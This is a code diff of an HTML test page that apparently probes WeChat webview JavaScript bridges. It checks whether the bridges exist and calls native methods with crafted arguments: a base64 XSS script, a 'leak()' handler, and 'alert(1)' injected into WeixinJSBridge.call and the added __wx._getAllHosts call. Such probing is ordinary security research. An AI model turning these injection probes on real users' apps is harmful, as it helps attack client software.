@@ -5,6 +5,9 @@
     if(typeof window.WeixinJSBridge === 'undefined') alert('WeixinJSBridge undefined');                                                          
     if(typeof window.WeixinJSContext === 'undefined') alert('WeixinJSContext undefined');                                                          
     if(typeof window.xwebToNative === 'undefined') alert('xwebToNative undefined');                                                          
+	if(typeof window.__wx === 'undefined') alert('__wx undefined');
+    if(typeof window.__wxtag === 'undefined') alert('__wxtag undefined');
+        
       
   </script>
   <a href="javascript:WeixinJSContext.allocEmpty()" onclick="leak()">CLICK</a>
@@ -12,4 +15,8 @@
   <a href="javascript:xwebToNative.onVideoEnterFullscreen(false, 0, 0, 0, false, false, 0, 0, [])">onVideoEnterFullscreen</a>
   <a href="javascript:xwebToNative.onVideoGetFrame(0, 0, 'data:image/png;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==')">onVideoGetFrame</a>
   <a href="javascript:WeixinJSBridge.call('alert(1)', {}, 'function x() { alert(2); }')">call TEST</a>
+
+  <script>
+  	window.__wx._getAllHosts("google.com, alert(1)");
+  </script>
 </body> 
